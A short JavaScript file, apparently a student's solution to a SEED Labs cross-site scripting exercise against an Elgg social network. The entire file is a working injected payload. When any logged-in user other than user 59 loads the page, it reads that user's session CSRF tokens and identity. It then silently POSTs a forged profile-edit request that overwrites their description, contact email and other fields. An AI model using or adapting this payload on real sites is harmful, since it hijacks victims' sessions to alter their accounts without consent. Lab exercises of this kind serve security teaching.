function generateRandomString(length) {
    return Array.from({ length: length }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]).join('');
}

window.onload = function(){
    if(elgg.session.user.guid && elgg.session.user.guid != 59 ){

        let formData = new FormData();
        let ts=elgg.security.token.__elgg_ts;
        let token=elgg.security.token.__elgg_token;
        let username = elgg.session.user.name;
        let guid = elgg.session.user.guid;
        
        
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('name', username);
        formData.append('guid', guid);
    
        let fields = ['description', 'briefdescription', 'location', 'interests', 'skills', 'contactemail', 'phone', 'mobile', 'website', 'twitter'];
    
        for (let i = 0; i < fields.length; i++) {
            formData.append(fields[i], generateRandomString(10));
            formData.append(`accesslevel[${fields[i]}]`, 1);
        }
    
        formData.set('description', '1905066');
        formData.set('contactemail', generateRandomString(10) + '@gmail.com');
    
    
        var sendurl ="http://www.seed-server.com/action/profile/edit" 
    
    
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.send(formData);
    }
}